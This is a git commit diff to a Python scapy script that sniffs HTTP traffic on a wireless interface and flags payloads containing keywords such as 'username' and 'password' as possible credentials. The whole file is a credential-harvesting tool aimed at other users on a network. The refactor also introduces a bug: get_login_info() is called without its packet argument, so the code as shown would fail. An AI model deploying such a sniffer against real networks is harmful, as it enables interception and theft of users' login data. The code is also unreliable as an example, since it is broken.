bf0fe49812682669df89e89fd8ac9795f20891ed
Pavlo Teyfel <pavloteyfel@gmail.com>
2022-04-14 23:34:05 +0200

    refactor: Separate logic

--- packetsniffer.py
+++ packetsniffer.py
@@ -8,25 +8,31 @@ init()
 def sniff_packet(iface):
     sniff(iface=iface, store=False, prn=process_packet)
 
+def get_login_info(packet):
+    if packet.haslayer(Raw):
+        load = packet[Raw].load.decode()
+        keywords = ["username", "user", "login", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
 def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
 
         ip = packet[IP].src
         url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
         method = packet[http.HTTPRequest].Method.decode()
-
         print("[+]", ip, method, url)
 
-        if packet.haslayer(Raw):
-            load = packet[Raw].load.decode()
-            keywords = ["username", "user", "login", "password", "pass"]
-            for keyword in keywords:
-                if keyword in load:
-                    print(f"{Fore.RED}[*] Possible credentials: {load}{Fore.RESET}")
-                    break
+        login_info = get_login_info()
+        if login_info:
+            print(f"{Fore.RED}[*] Possible credentials: {login_info}{Fore.RESET}")
+
+
 
 if __name__ == "__main__":
 
-    INTERFACE = "wlan0"
+    iface = "wlan0"
 
-    sniff_packet(INTERFACE)
+    sniff_packet(iface)
